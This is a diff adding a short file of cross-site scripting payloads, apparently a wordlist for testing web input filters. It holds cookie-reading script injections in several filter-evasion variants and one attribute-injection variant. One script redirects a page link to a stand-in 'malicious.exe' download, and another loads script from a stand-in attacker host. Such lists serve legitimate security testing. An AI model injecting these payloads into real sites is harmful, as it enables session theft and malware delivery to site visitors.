@@ -1,0 +1,13 @@
+“><script>alert(document.cookie)</script>
+<script>window.onload = function() {var AllLinks=document.getElementsByTagName("a"); 
+AllLinks[0].href = "http://badexample.com/malicious.exe"; }</script> 
+" onfocus="alert(document.cookie)
+"><script >alert(document.cookie)</script >
+"><ScRiPt>alert(document.cookie)</ScRiPt>
+"%3cscript%3ealert(document.cookie)%3c/script%3e
+<scr<script>ipt>alert(document.cookie)</script>
+<SCRIPT%20a=">"%20SRC="http://attacker/xss.js"></SCRIPT> 
+<script>[...]</script>
+<script&param=>[...]</&param=script>
+
+
